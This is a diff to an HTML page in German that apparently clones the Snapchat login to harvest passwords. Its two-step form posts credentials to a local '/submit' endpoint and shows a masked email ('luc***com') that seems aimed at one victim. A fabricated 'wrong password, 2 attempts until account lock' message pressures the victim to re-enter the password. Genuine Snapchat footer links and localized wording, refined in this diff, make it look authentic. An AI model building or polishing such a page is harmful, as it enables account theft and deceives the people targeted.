@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="de">
 <head>
   <meta charset="UTF-8" />
@@ -8,11 +8,8 @@
   <link rel="icon" type="image/png" href="snapchat-logo.png" />
 </head>
 <body>
-
-  <!-- LOGIN-BEREICH -->
   <div class="login-container">
     <form action="/submit" method="POST">
-      
       <div class="login-box" id="step1">
         <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
         <h2>Logge dich bei<br />Snapchat ein</h2>
@@ -25,27 +22,20 @@
         <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
         <h2>Passwort eingeben</h2>
         <div class="email-mask">
-          luc***com 
+          luc***com
           <a href="#" onclick="goToStep1()">Das bist nicht du?</a>
         </div>
         <label for="password">Passwort</label>
         <input type="password" id="password" name="password" required />
         <div id="password-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
-          Falsches Passwort. Noch 2 Versuche bis Kontosperrung.
+          Falsches Passwort. Noch 2 Versuche bis zur Kontosperrung.
         </div>
         <button type="button" id="step2-button" disabled>Weiter</button>
       </div>
-
     </form>
-
-     <!-- REGISTRIEREN-HINWEIS -->
-    <div class="signup-hint">
-      Neu bei Snapchat? <a href="https://accounts.snapchat.com/v2/signup" target="_blank"><strong>Registrieren</strong></a>
-    </div>
   </div>
 
-  <!-- DESKTOP FOOTER -->
-  <footer>
+  <footer class="desktop-only">
     <div class="footer-columns">
       <div>
         <h4>Unternehmen</h4>
@@ -59,32 +49,34 @@
         <h4>Community</h4>
         <ul>
           <li><a href="https://help.snapchat.com/" target="_blank">Support</a></li>
-          <li><a href="https://values.snap.com/policy/policy-community-guidelines" target="_blank">Community-Richtlinien</a></li>
-          <li><a href="https://values.snap.com/safety/safety-center" target="_blank">Sicherheitscenter</a></li>
+          <li><a href="https://values.snap.com/policy/policy-community-guidelines?lang=de-DE" target="_blank">Community-Richtlinien</a></li>
+          <li><a href="https://values.snap.com/safety/safety-center?lang=de-DE" target="_blank">Sicherheitscenter</a></li>
         </ul>
       </div>
       <div>
         <h4>Werbung</h4>
         <ul>
           <li><a href="https://forbusiness.snapchat.com/" target="_blank">Anzeigen schalten</a></li>
-          <li><a href="https://www.snap.com/ad-policies" target="_blank">Werberichtlinien</a></li>
-          <li><a href="https://www.snap.com/political-ads" target="_blank">Politische Anzeigen</a></li>
+          <li><a href="https://www.snap.com/ad-policies?lang=de-DE" target="_blank">Werberichtlinien</a></li>
+          <li><a href="https://www.snap.com/political-ads?lang=de-DE" target="_blank">Politische Anzeigen</a></li>
+          <li><a href="https://www.snap.com/brand-guidelines?lang=de-DE" target="_blank">Markenrichtlinien</a></li>
+          <li><a href="https://help.snapchat.com/hc/de/articles/7047502545044" target="_blank">Aktionsrichtlinien</a></li>
         </ul>
       </div>
       <div>
         <h4>Rechtliches</h4>
         <ul>
-          <li><a href="https://values.snap.com/privacy/privacy-center" target="_blank">Datenschutzzentrum</a></li>
-          <li><a href="https://www.snap.com/cookie-policy" target="_blank">Cookie-Richtlinien</a></li>
-          <li><a href="https://help.snapchat.com/hc/articles/7012332110996" target="_blank">Verstoß melden</a></li>
-          <li><a href="https://www.snap.com/terms/custom-creative-tools?lang=de-DE" target="_blank">Bedingungen für <br />benutzerdefinierte Kreativtools</a></li>
-          <li><a href="https://www.snap.com/terms/create-geofilter?lang=de-DE" target="_blank">AGB für Geofilter</a></li>
-          <li><a href="https://www.snap.com/terms/lens-studio-license-agreement?lang=de-DE" target="_blank">Geschäftsbedingungen für Lens Studio</a></li>
+          <li><a href="https://values.snap.com/privacy/privacy-center?lang=de-DE" target="_blank">Datenschutzzentrum</a></li>
+          <li><a href="https://help.snapchat.com/hc/de/articles/11399265637012" target="_blank">Deine Datenschutzoptionen</a></li>
+          <li><a href="https://www.snap.com/cookie-policy?lang=de-DE" target="_blank">Cookie-Richtlinie</a></li>
+          <li><a href="https://help.snapchat.com/hc/de/articles/7012332110996" target="_blank">Missbrauch melden</a></li>
+          <li><a href="https://www.snap.com/terms/custom-creative-tools?lang=de-DE" target="_blank">Kreativtools-Nutzungsbedingungen</a></li>
+          <li><a href="https://www.snap.com/terms/create-geofilter?lang=de-DE" target="_blank">Geofilter-Bedingungen</a></li>
+          <li><a href="https://www.snap.com/terms/lens-studio-license-agreement?lang=de-DE" target="_blank">Lens Studio Lizenz</a></li>
         </ul>
       </div>
     </div>
 
-    <!-- Sprache nur für DESKTOP -->
     <div class="language-selector desktop-only">
       <label for="language-desktop">Sprache</label>
       <select id="language-desktop" name="language">
@@ -96,10 +88,9 @@
     </div>
   </footer>
 
-  <!-- MOBILE FOOTER DROPDOWN -->
-  <div class="footer-dropdown">
+  <div class="footer-dropdown mobile-only">
     <div>
-      <button class="dropdown-toggle mobile-only">Unternehmen</button>
+      <button class="dropdown-toggle">Unternehmen</button>
       <ul class="dropdown-content">
         <li><a href="https://www.snap.com/?lang=de-DE" target="_blank">Snap Inc.</a></li>
         <li><a href="https://careers.snap.com/" target="_blank">Karriere</a></li>
@@ -110,31 +101,28 @@
       <button class="dropdown-toggle">Community</button>
       <ul class="dropdown-content">
         <li><a href="https://help.snapchat.com/" target="_blank">Support</a></li>
-        <li><a href="https://values.snap.com/policy/policy-community-guidelines" target="_blank">Community-Richtlinien</a></li>
-        <li><a href="https://values.snap.com/safety/safety-center" target="_blank">Sicherheitscenter</a></li>
+        <li><a href="https://values.snap.com/policy/policy-community-guidelines?lang=de-DE" target="_blank">Community-Richtlinien</a></li>
+        <li><a href="https://values.snap.com/safety/safety-center?lang=de-DE" target="_blank">Sicherheitscenter</a></li>
       </ul>
     </div>
     <div>
       <button class="dropdown-toggle">Werbung</button>
       <ul class="dropdown-content">
         <li><a href="https://forbusiness.snapchat.com/" target="_blank">Anzeigen schalten</a></li>
-        <li><a href="https://www.snap.com/ad-policies" target="_blank">Werberichtlinien</a></li>
-        <li><a href="https://www.snap.com/political-ads" target="_blank">Politische Anzeigen</a></li>
+        <li><a href="https://www.snap.com/ad-policies?lang=de-DE" target="_blank">Werberichtlinien</a></li>
+        <li><a href="https://www.snap.com/political-ads?lang=de-DE" target="_blank">Politische Anzeigen</a></li>
       </ul>
     </div>
     <div>
       <button class="dropdown-toggle">Rechtliches</button>
       <ul class="dropdown-content">
-        <li><a href="https://values.snap.com/privacy/privacy-center" target="_blank">Datenschutz</a></li>
-        <li><a href="https://www.snap.com/cookie-policy" target="_blank">Cookies</a></li>
-        <li><a href="https://help.snapchat.com/hc/articles/7012332110996" target="_blank">Verstoß melden</a></li>
-        <li><a href="https://www.snap.com/terms/custom-creative-tools?lang=de-DE" target="_blank">Bedingungen für benutzerdefinierte Kreativtools</a></li>
-        <li><a href="https://www.snap.com/terms/create-geofilter?lang=de-DE" target="_blank">AGB für Geofilter</a></li>
-        <li><a href="https://www.snap.com/terms/lens-studio-license-agreement?lang=de-DE" target="_blank">Geschäftsbedingungen für Lens Studio</a></li>
+        <li><a href="https://values.snap.com/privacy/privacy-center?lang=de-DE" target="_blank">Datenschutzzentrum</a></li>
+        <li><a href="https://help.snapchat.com/hc/de/articles/11399265637012" target="_blank">Deine Datenschutzoptionen</a></li>
+        <li><a href="https://www.snap.com/cookie-policy?lang=de-DE" target="_blank">Cookie-Richtlinie</a></li>
+        <li><a href="https://help.snapchat.com/hc/de/articles/7012332110996" target="_blank">Missbrauch melden</a></li>
       </ul>
     </div>
 
-    <!-- Sprache nur für MOBILE -->
     <div class="language-selector mobile-only">
       <label for="language-mobile">Sprache</label>
       <select id="language-mobile" name="language">
@@ -146,63 +134,63 @@
     </div>
   </div>
 
-  <!-- GRAUER BALKEN UNTEN -->
   <div class="bottom-bar">
     <a href="https://values.snap.com/privacy/privacy-policy?lang=de-DE" target="_blank">Datenschutzbestimmungen</a>
-    <a href="https://www.snap.com/terms?lang=de-DE" target="_blank">Servicebestimmungen</a>
+    <a href="https://www.snap.com/terms?lang=de-DE" target="_blank">Nutzungsbedingungen</a>
   </div>
-  
+
   <script src="script.js"></script>
   <script>
-document.addEventListener("DOMContentLoaded", function () {
-  function handleLanguageChange(selectedLang) {
-    switch (selectedLang) {
-      case "de":
-        window.location.href = "/index.html";
-        break;
-      case "en":
-        window.location.href = "/en.html";
-        break;
-      case "fr":
-        window.location.href = "/fr.html";
-        break;
-      case "es":
-        window.location.href = "/es.html";
-        break;
+  document.addEventListener("DOMContentLoaded", function () {
+    function handleLanguageChange(selectedLang) {
+      switch (selectedLang) {
+        case "de":
+          window.location.href = "/index.html";
+          break;
+        case "en":
+          window.location.href = "/en.html";
+          break;
+        case "fr":
+          window.location.href = "/fr.html";
+          break;
+        case "es":
+          window.location.href = "/es.html";
+          break;
+      }
     }
-  }
 
-  const desktopSelect = document.getElementById("language-desktop");
-  const mobileSelect = document.getElementById("language-mobile");
+    const desktopSelect = document.getElementById("language-desktop");
+    const mobileSelect = document.getElementById("language-mobile");
 
-  if (desktopSelect) {
-    desktopSelect.addEventListener("change", function () {
-      handleLanguageChange(this.value);
-    });
-  }
-
-  if (mobileSelect) {
-    mobileSelect.addEventListener("change", function () {
-      handleLanguageChange(this.value);
-    });
-  }
-
-  // Dropdown-Menüs bei Mobile
-  if (window.innerWidth <= 768) {
-    document.querySelectorAll(".dropdown-toggle").forEach(button => {
-      button.addEventListener("click", () => {
-        const content = button.nextElementSibling;
-        const isVisible = content.style.display === "block";
-
-        document.querySelectorAll(".dropdown-content").forEach(el => el.style.display = "none");
-        document.querySelectorAll(".dropdown-toggle").forEach(btn => btn.classList.remove("active"));
-
-        if (!isVisible) {
-          content.style.display = "block";
-          button.classList.add("active");
-        }
+    if (desktopSelect) {
+      desktopSelect.addEventListener("change", function () {
+        handleLanguageChange(this.value);
       });
-    });
-  }
-});
-</script>
+    }
+
+    if (mobileSelect) {
+      mobileSelect.addEventListener("change", function () {
+        handleLanguageChange(this.value);
+      });
+    }
+
+    if (window.innerWidth <= 768) {
+      document.querySelectorAll(".dropdown-toggle").forEach(button => {
+        button.addEventListener("click", () => {
+          const content = button.nextElementSibling;
+          const isVisible = content.style.display === "block";
+
+          document.querySelectorAll(".dropdown-content").forEach(el => el.style.display = "none");
+          document.querySelectorAll(".dropdown-toggle").forEach(btn => btn.classList.remove("active"));
+
+          if (!isVisible) {
+            content.style.display = "block";
+            button.classList.add("active");
+          }
+        });
+      });
+    }
+  });
+  </script>
+</body>
+</html>
